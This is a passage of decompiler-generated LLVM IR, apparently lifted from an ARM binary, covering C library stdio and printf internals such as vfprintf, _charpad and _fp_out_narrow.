  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_12874 = icmp eq i32 %storemerge1, 0
  br i1 %v2_12874, label %dec_label_pc_12874.dec_label_pc_1287c_crit_edge, label %dec_label_pc_12860

dec_label_pc_12874.dec_label_pc_1287c_crit_edge:  ; preds = %dec_label_pc_12860
  %v11_1287c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12874.dec_label_pc_1287c_crit_edge, %dec_label_pc_12854
  %v11_1287c = phi i32 [ %v11_1287c.pre, %dec_label_pc_12874.dec_label_pc_1287c_crit_edge ], [ %v11_1287c13, %dec_label_pc_12854 ]
  %v2_1287c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1287c, i32* @r4, align 4
  ret i32 %v11_1287c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12860, { 1, 0 }
  uselistorder label %dec_label_pc_12834, { 1, 0 }
  uselistorder label %dec_label_pc_127f8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12890 = load i32, i32* @r4, align 4
  store i32 %v3_12890, i32* %stack_var_-8, align 4
  %v0_12894 = load i32, i32* @r0, align 4
  %v1_12894 = add i32 %v0_12894, 8
  %v2_12894 = inttoptr i32 %v1_12894 to i32*
  %v3_12894 = load i32, i32* %v2_12894, align 4
  %v1_12898 = add i32 %v0_12894, 16
  %v2_12898 = inttoptr i32 %v1_12898 to i32*
  %v3_12898 = load i32, i32* %v2_12898, align 4
  %v9_1289c = icmp eq i32 %v3_12898, %v3_12894
  store i32 %v0_12894, i32* %r4.global-to-local, align 4
  br i1 %v9_1289c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_12894, i32* %v2_12898, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 75952, i32* @lr, align 4
  %v1_128ac = xor i1 %v9_1289c, true
  call void @__pseudo_cond_branch(i1 %v1_128ac, i32 ptrtoint (i32* @global_var_166b8.1037 to i32))
  %v0_128b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_128b0 = add i32 %v0_128b0, 8
  %v2_128b0 = inttoptr i32 %v1_128b0 to i32*
  %v3_128b0 = load i32, i32* %v2_128b0, align 4
  %v1_128b4 = add i32 %v0_128b0, 16
  %v2_128b4 = inttoptr i32 %v1_128b4 to i32*
  %v3_128b4 = load i32, i32* %v2_128b4, align 4
  %v2_128b8 = sub i32 %v3_128b4, %v3_128b0
  %v2_128bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_128bc, i32* @r4, align 4
  ret i32 %v2_128b8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v2_128c4 = add i32 %tmp, 52
  %v3_128c4 = inttoptr i32 %v2_128c4 to i32*
  %v4_128c4 = load i32, i32* %v3_128c4, align 4
  store i32 %v4_128c4, i32* @r8, align 4
  %v2_128c8 = add i32 %tmp, 56
  store i32 %v2_128c8, i32* @r5, align 4
  %v2_128cc = ptrtoint i32* %stack_var_-40 to i32
  %v2_128d0 = icmp eq i32 %v4_128c4, 0
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_128cc, i32* @r0, align 4
  br i1 %v2_128d0, label %dec_label_pc_128f0, label %dec_label_pc_1290c

dec_label_pc_128f0:                               ; preds = %entry
  %v1_128f8 = call i32 @__pthread_return_void()
  store i32 76044, i32* @lr, align 4
  %v1_12908 = call i32 @__pthread_return_0()
  %v0_1290c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1290c

dec_label_pc_1290c:                               ; preds = %entry, %dec_label_pc_128f0
  %v0_1291c = phi i32 [ %tmp, %entry ], [ %v0_1290c.pre, %dec_label_pc_128f0 ]
  %v1_1290c = inttoptr i32 %v0_1291c to i8*
  %v2_1290c = load i8, i8* %v1_1290c, align 1
  %v2_12914 = icmp ugt i8 %v2_1290c, -65
  br i1 %v2_12914, label %dec_label_pc_12934, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_1290c
  %v4_12924 = call i32 @__stdio_trans2w_o(i8* %v1_1290c, i32 128)
  %v2_12928 = icmp eq i32 %v4_12924, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_12928, label %dec_label_pc_12924.dec_label_pc_12934_crit_edge, label %dec_label_pc_12948

dec_label_pc_12924.dec_label_pc_12934_crit_edge:  ; preds = %dec_label_pc_12924
  %v0_1293c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12934

dec_label_pc_12934:                               ; preds = %dec_label_pc_12924.dec_label_pc_12934_crit_edge, %dec_label_pc_1290c
  %v0_1293c = phi i32 [ %v0_1293c.pre, %dec_label_pc_12924.dec_label_pc_12934_crit_edge ], [ %v0_1291c, %dec_label_pc_1290c ]
  %v0_12934 = load i32, i32* @r7, align 4
  %v0_12938 = load i32, i32* @r6, align 4
  %v4_12940 = inttoptr i32 %v0_12934 to i8*
  %v5_12940 = call i32 @_vfprintf_internal(i32 %v0_1293c, i8* %v4_12940, i32 %v0_12938)
  store i32 %v5_12940, i32* @r5, align 4
  br label %dec_label_pc_12948

dec_label_pc_12948:                               ; preds = %dec_label_pc_12924, %dec_label_pc_12934
  %v0_129605 = phi i32 [ -1, %dec_label_pc_12924 ], [ %v5_12940, %dec_label_pc_12934 ]
  %v0_12948 = load i32, i32* @r8, align 4
  %v2_12948 = icmp eq i32 %v0_12948, 0
  br i1 %v2_12948, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12948
  call void @__pseudo_branch(i32 90076)
  %v0_12960.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12948, %bb
  %v0_12960 = phi i32 [ %v0_129605, %dec_label_pc_12948 ], [ %v0_12960.pre, %bb ]
  ret i32 %v0_12960

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12948, { 1, 0 }
  uselistorder label %dec_label_pc_1290c, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_1297c = load i32, i32* @r4, align 4
  %v6_1297c = load i32, i32* @r5, align 4
  %v9_1297c = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_1299c2 = icmp eq i32 %arg3, 0
  %v2_129a0 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_1299c2, label %dec_label_pc_129bc, label %dec_label_pc_129b0

dec_label_pc_12998:                               ; preds = %dec_label_pc_129b0
  %v1_12998 = add i32 %v0_12998, -1
  store i32 %v1_12998, i32* @r4, align 4
  %v2_1299c = icmp eq i32 %v1_12998, 0
  %v0_129a8 = load i32, i32* @r6, align 4
  br i1 %v2_1299c, label %dec_label_pc_129bc.loopexit, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %entry, %dec_label_pc_12998
  %v0_129a84 = phi i32 [ %v0_129a8, %dec_label_pc_12998 ], [ %arg1, %entry ]
  %v3_129b0 = call i32 @__stdio_fwrite(i32 %v2_129a0, i32 1, i32 %v0_129a84)
  %v7_129b4 = icmp eq i32 %v3_129b0, 1
  %v0_12998 = load i32, i32* @r4, align 4
  br i1 %v7_129b4, label %dec_label_pc_12998, label %dec_label_pc_129bc.loopexit

dec_label_pc_129bc.loopexit:                      ; preds = %dec_label_pc_12998, %dec_label_pc_129b0
  %v0_129bc.ph = phi i32 [ %v0_12998, %dec_label_pc_129b0 ], [ 0, %dec_label_pc_12998 ]
  %v1_129bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129bc

dec_label_pc_129bc:                               ; preds = %dec_label_pc_129bc.loopexit, %entry
  %v1_129bc = phi i32 [ 0, %entry ], [ %v1_129bc.pre, %dec_label_pc_129bc.loopexit ]
  %v0_129bc = phi i32 [ 0, %entry ], [ %v0_129bc.ph, %dec_label_pc_129bc.loopexit ]
  %v2_129bc = sub i32 %v1_129bc, %v0_129bc
  store i32 %v3_1297c, i32* @r4, align 4
  store i32 %v6_1297c, i32* @r5, align 4
  store i32 %v9_1297c, i32* @r6, align 4
  ret i32 %v2_129bc

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_129bc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_129b0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_129c8 = load i32, i32* @r4, align 4
  store i32 %v3_129c8, i32* %stack_var_-24, align 4
  %v9_129c8 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_129d0 = and i32 %arg2, 128
  %v2_129d0 = icmp eq i32 %v1_129d0, 0
  %v0_129d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_129d4, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_129d0, label %bb, label %dec_label_pc_129e8

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a28

dec_label_pc_129e8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_129ec = call i32 @strlen(i8* %arg4)
  store i32 %v3_129ec, i32* %r0.global-to-local, align 4
  %v1_129f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_129f0 = sub i32 %v1_129f0, %v3_129ec
  store i32 %v2_129f0, i32* @r4, align 4
  store i32 %v3_129ec, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_129f0, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_12a08

.thread:                                          ; preds = %dec_label_pc_129e8
  store i32 %v3_129ec, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a28

dec_label_pc_12a08:                               ; preds = %dec_label_pc_129e8
  %v0_12a08 = load i32, i32* @r6, align 4
  %v1_12a08 = urem i32 %v0_12a08, 128
  %v0_12a0c = load i32, i32* @r8, align 4
  store i32 %v0_12a0c, i32* %r0.global-to-local, align 4
  %v3_12a14 = trunc i32 %v1_12a08 to i8
  %v4_12a14 = call i32 @_charpad(i32 %v0_12a0c, i8 %v3_12a14, i32 %v2_129f0)
  store i32 %v4_12a14, i32* %r0.global-to-local, align 4
  %v1_12a18 = load i32, i32* @r4, align 4
  %v9_12a18 = icmp eq i32 %v4_12a14, %v1_12a18
  store i32 %v4_12a14, i32* %r6.global-to-local, align 4
  br i1 %v9_12a18, label %dec_label_pc_12a24, label %dec_label_pc_12a44

dec_label_pc_12a24:                               ; preds = %dec_label_pc_12a08
  %v0_12a24 = load i32, i32* @r5, align 4
  store i32 %v0_12a24, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a28

dec_label_pc_12a28:                               ; preds = %bb, %.thread, %dec_label_pc_12a24
  %v5_12a34 = phi i32 [ %v0_12a24, %dec_label_pc_12a24 ], [ %arg3, %bb ], [ %v3_129ec, %.thread ]
  %tmp17 = icmp slt i32 %v5_12a34, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_12a28
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_12a28
  %v5_12a30 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_12a30, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_16774.1042 to i32))
  %v0_12a40 = load i32, i32* %r6.global-to-local, align 4
  %v2_12a40 = add i32 %storemerge, %v0_12a40
  store i32 %v2_12a40, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a08, %bb19
  %v0_12a44 = phi i32 [ %v4_12a14, %dec_label_pc_12a08 ], [ %v2_12a40, %bb19 ]
  store i32 %v0_12a44, i32* %r0.global-to-local, align 4
  %v2_12a48 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12a48, i32* %r4.global-to-local, align 4
  store i32 %v9_129c8, i32* %r6.global-to-local, align 4
  ret i32 %v0_12a44

; uselistorder directives
  uselistorder i32 %v0_12a44, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12a44, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_12a28, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12a4c = load i32, i32* @r4, align 4
  store i32 %v3_12a4c, i32* %stack_var_-36, align 4
  %v6_12a4c = load i32, i32* @r5, align 4
  %v15_12a4c = load i32, i32* @r8, align 4
  %v18_12a4c = load i32, i32* @sb, align 4
  %v21_12a4c = load i32, i32* @sl, align 4
  %v24_12a4c = load i32, i32* @fp, align 4
  %v2_12a54 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_12a54, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  %v0_12a60 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12a60, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_12a68 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_12a68, i32* %r0.global-to-local, align 4
  %v1_12a6c = icmp slt i32 %v2_12a68, 0
  br i1 %v1_12a6c, label %dec_label_pc_12a74, label %dec_label_pc_12aa8

dec_label_pc_12a74:                               ; preds = %entry
  %v3_12a74 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_12a74, i32* @r4, align 4
  %v1_12a78 = inttoptr i32 %v3_12a74 to i8*
  store i32 %v3_12a74, i32* %r0.global-to-local, align 4
  %v3_12a7c = call i32 @strlen(i8* %v1_12a78)
  store i32 %v3_12a7c, i32* %r0.global-to-local, align 4
  %v2_12a80 = icmp eq i32 %v3_12a7c, 0
  br i1 %v2_12a80, label %bb, label %dec_label_pc_12a90

bb:                                               ; preds = %dec_label_pc_12a74
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13020

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a74
  %v0_12a90 = load i32, i32* @r4, align 4
  store i32 %v0_12a90, i32* %r0.global-to-local, align 4
  %v0_12a94 = load i32, i32* @fp, align 4
  store i32 %v0_12a94, i32* %r2.global-to-local, align 4
  %v3_12a98 = call i32 @__stdio_fwrite(i32 %v0_12a90, i32 %v3_12a7c, i32 %v0_12a94)
  store i32 %v3_12a98, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13020

dec_label_pc_12aa8:                               ; preds = %entry
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  %v0_12aac = load i32, i32* @r5, align 4
  %v2_12ab0 = call i32 @_ppfs_prepargs(i32 %v2_12a54, i32 %v0_12aac)
  store i32 %v2_12ab0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_12b50 = zext i8 %tmp104 to i32
  %v2_12b58 = ptrtoint i32* %stack_var_-252 to i32
  %v2_12b78 = ptrtoint i32* %stack_var_-36 to i32
  %v2_12b90 = icmp eq i32 %tmp102, 0
  %v1_12ba4 = inttoptr i32 %tmp101 to i32*
  %v2_12e94 = ptrtoint i32* %stack_var_-180 to i32
  %v2_12db0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_12dc4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_12d60 = add i32 %tmp101, 4
  %v4_12d60 = inttoptr i32 %v3_12d60 to i32*
  %v2_12d64 = ptrtoint i32* %stack_var_-328 to i32
  %v7_12c24 = zext i8 %tmp99 to i32
  %v2_12c60 = ptrtoint i32* %stack_var_-53 to i32
  %v5_12c68 = bitcast i32* %stack_var_-53 to i8*
  %v2_12c70 = icmp ugt i32 %tmp102, 4
  %v7_12c70 = icmp eq i32 %tmp102, 5
  %v0_13008.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_12b88187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_12d84 = icmp ugt i32 %tmp102, 16
  %v7_12d84 = icmp eq i32 %tmp102, 17
  %v2_12d88 = xor i1 %v7_12d84, true
  %v3_12d88 = and i1 %v2_12d84, %v2_12d88
  %v2_12e24 = icmp ugt i32 %tmp102, 18
  %v7_12e24 = icmp eq i32 %tmp102, 19
  %v2_12e28 = xor i1 %v7_12e24, true
  %v3_12e28 = and i1 %v2_12e24, %v2_12e28
  %v7_12e88 = icmp eq i32 %tmp102, 20
  %v2_12bc8 = add i32 %tmp102, ptrtoint (i32* @global_var_232cc.1044 to i32)
  %v1_12bcc = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_232cc.1044 to i32), i32 -1)
  %v2_12bcc = inttoptr i32 %v1_12bcc to i8*
  %v2_12bf8 = xor i1 %v7_12c70, true
  %v3_12bf8 = and i1 %v2_12c70, %v2_12bf8
  %v7_12c2c = icmp eq i32 %tmp102, 1
  %v2_12c78 = xor i1 %v2_12c70, true
  %v3_12c78 = or i1 %v7_12c70, %v2_12c78
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_12ce0 = icmp eq i32 %tmp102, 3
  %v11_12cec = icmp eq i32 %tmp102, 4
  %v9_12b5c = mul nuw nsw i32 %v4_12b50, 8
  %v10_12b5c = add nsw i32 %v9_12b5c, -8
  %v6_12b64 = add i32 %v10_12b5c, %v2_12b58
  br label %dec_label_pc_13008

bb126:                                            ; preds = %dec_label_pc_12ac0.outer, %.thread7
  %v2_12ac0185 = phi i8 [ %v2_12ac0, %.thread7 ], [ %v2_12ac0181, %dec_label_pc_12ac0.outer ]
  %v1_12ad4184 = phi i32 [ %v2_12ad4, %.thread7 ], [ %v0_12ac049, %dec_label_pc_12ac0.outer ]
  %v8_12ac8 = icmp eq i8 %v2_12ac0185, 37
  br i1 %v8_12ac8, label %dec_label_pc_12adc, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12ad4 = add i32 %v1_12ad4184, 1
  store i32 %v2_12ad4, i32* @r4, align 4
  %v1_12ac0 = inttoptr i32 %v2_12ad4 to i8*
  %v2_12ac0 = load i8, i8* %v1_12ac0, align 1
  %v3_12ac0 = zext i8 %v2_12ac0 to i32
  store i32 %v3_12ac0, i32* %r3.global-to-local, align 4
  %v2_12ac4 = icmp eq i8 %v2_12ac0, 0
  br i1 %v2_12ac4, label %dec_label_pc_12adc, label %bb126

dec_label_pc_12adc:                               ; preds = %bb126, %.thread7, %dec_label_pc_12ac0.outer
  %v1_12ad4.lcssa = phi i32 [ %v0_12ac049, %dec_label_pc_12ac0.outer ], [ %v2_12ad4, %.thread7 ], [ %v1_12ad4184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12adc = sub i32 %v1_12ad4.lcssa, %v5_12aec
  %v9_12adc = icmp eq i32 %v1_12ad4.lcssa, %v5_12aec
  br i1 %v9_12adc, label %dec_label_pc_12b10, label %dec_label_pc_12ae4

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12adc
  store i32 %v2_12adc, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_12adc, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_12ae4
  store i32 %v5_12aec, i32* %r0.global-to-local, align 4
  %v5_12af4 = load i32, i32* @fp, align 4
  store i32 %v5_12af4, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_12ae4, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_12ae4 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_16774.1042 to i32))
  %v0_12afc = load i32, i32* %r0.global-to-local, align 4
  %v1_12afc = load i32, i32* @r5, align 4
  %v9_12afc = icmp eq i32 %v0_12afc, %v1_12afc
  br i1 %v9_12afc, label %dec_label_pc_12b04, label %dec_label_pc_13018

dec_label_pc_12b04:                               ; preds = %bb130
  %v2_12b08 = add i32 %v0_12afc, %stack_var_-336.1.ph
  %v0_12b10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12b10

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12adc, %dec_label_pc_12b04
  %v0_12b24 = phi i32 [ %v5_12aec, %dec_label_pc_12adc ], [ %v0_12b10.pre, %dec_label_pc_12b04 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_12adc ], [ %v2_12b08, %dec_label_pc_12b04 ]
  %v1_12b10 = inttoptr i32 %v0_12b24 to i8*
  %v2_12b10 = load i8, i8* %v1_12b10, align 1
  %v3_12b10 = zext i8 %v2_12b10 to i32
  store i32 %v3_12b10, i32* %r3.global-to-local, align 4
  %v2_12b14 = icmp eq i8 %v2_12b10, 0
  br i1 %v2_12b14, label %dec_label_pc_13020, label %dec_label_pc_12b1c

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12b10
  %v1_12b1c = add i32 %v0_12b24, 1
  %v2_12b1c = inttoptr i32 %v1_12b1c to i8*
  %v3_12b1c = load i8, i8* %v2_12b1c, align 1
  %v4_12b1c = zext i8 %v3_12b1c to i32
  store i32 %v4_12b1c, i32* %r3.global-to-local, align 4
  %v7_12b20 = icmp eq i8 %v3_12b1c, 37
  store i32 %v1_12b1c, i32* %r2.global-to-local, align 4
  br i1 %v7_12b20, label %dec_label_pc_13010, label %dec_label_pc_12b2c

dec_label_pc_12b2c:                               ; preds = %dec_label_pc_12b1c
  store i32 %v2_12a54, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  store i32 %v1_12b1c, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_12b40 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_12a54, i32* @r0, align 4
  %v0_12b48 = call i32 @_ppfs_setargs()
  store i32 %v0_12b48, i32* %r0.global-to-local, align 4
  store i32 %v4_12b50, i32* %ip.global-to-local, align 4
  store i32 %v2_12b58, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_12b2c
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_12b2c
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_12b64, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_12b7078 = phi i32 [ %v6_12b64, %bb133 ], [ %v2_12b58, %.thread ]
  store i32 %v2_12b78, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_12b88187, label %dec_label_pc_12b70, label %dec_label_pc_12b8c

dec_label_pc_12b70:                               ; preds = %bb134, %dec_label_pc_12b70
  %v5_12b80189 = phi i32 [ %v5_12b80, %dec_label_pc_12b70 ], [ %v2_12b78, %bb134 ]
  %v0_12b70188 = phi i32 [ %v1_12b74, %dec_label_pc_12b70 ], [ %v0_12b7078, %bb134 ]
  %v2_12b70 = add i32 %v5_12b80189, -4
  %v3_12b70 = inttoptr i32 %v2_12b70 to i32*
  store i32 %v0_12b70188, i32* %v3_12b70, align 4
  %v0_12b74 = load i32, i32* %r3.global-to-local, align 4
  %v1_12b74 = add i32 %v0_12b74, 8
  store i32 %v1_12b74, i32* %r3.global-to-local, align 4
  %v0_12b7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12b7c.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_12b78, i32* @lr, align 4
  %v4_12b80 = mul i32 %v0_12b7c.pre, 4
  %v5_12b80 = add i32 %v4_12b80, %v2_12b78
  %v1_12b84 = add i32 %v0_12b7c.pre, 1
  store i32 %v1_12b84, i32* %r2.global-to-local, align 4
  %v5_12b88 = icmp slt i32 %v0_12b7c.pre, %v1_12b7c.pre
  br i1 %v5_12b88, label %dec_label_pc_12b70, label %dec_label_pc_12b8c

dec_label_pc_12b8c:                               ; preds = %dec_label_pc_12b70, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_12b90, label %dec_label_pc_12b98, label %dec_label_pc_12bbc

dec_label_pc_12b98:                               ; preds = %dec_label_pc_12b8c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_12ba4 = load i32, i32* %v1_12ba4, align 4
  store i32 %v2_12ba4, i32* %r0.global-to-local, align 4
  %v1_12ba8 = and i32 %v0_12bec, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_12bb0 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_12bb0, i32* %r3.global-to-local, align 4
  %v4_12bb4 = inttoptr i32 %v2_12ba4 to i8*
  %v5_12bb4 = call i32 @_store_inttype(i8* %v4_12bb4, i32 %v1_12ba8, i32 %stack_var_-336.2, i32 %v3_12bb0)
  store i32 %v5_12bb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13004

dec_label_pc_12bbc:                               ; preds = %dec_label_pc_12b8c
  br i1 %tmp195, label %dec_label_pc_12d48, label %dec_label_pc_12bc4

dec_label_pc_12bc4:                               ; preds = %dec_label_pc_12bbc
  store i32 %v2_12bc8, i32* %r3.global-to-local, align 4
  %v3_12bcc = load i8, i8* %v2_12bcc, align 1
  %v4_12bcc = zext i8 %v3_12bcc to i32
  store i32 %v4_12bcc, i32* @r4, align 4
  %v7_12bd0 = icmp eq i8 %v3_12bcc, 10
  br i1 %v7_12bd0, label %dec_label_pc_12bdc, label %bb135

bb135:                                            ; preds = %dec_label_pc_12bc4
  store i32 87, i32* @r5, align 4
  br label %bb139

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12bc4
  store i32 %v0_12bec, i32* %r3.global-to-local, align 4
  %v1_12be0 = and i32 %v0_12bec, 32
  %v2_12be0 = icmp eq i32 %v1_12be0, 0
  %.175 = select i1 %v2_12be0, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_12bec = and i32 %v0_12bec, 64
  %v2_12bec = icmp eq i32 %v1_12bec, 0
  br i1 %v2_12bec, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_12bdc
  %.176 = select i1 %v2_12be0, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_12bdc, %bb138
  br i1 %v3_12bf8, label %.thread84, label %dec_label_pc_12c00

.thread84:                                        ; preds = %bb139
  %v5_12bf8 = sub nsw i32 0, %v4_12bcc
  store i32 %v5_12bf8, i32* @r4, align 4
  br label %dec_label_pc_12c18

dec_label_pc_12c00:                               ; preds = %bb139
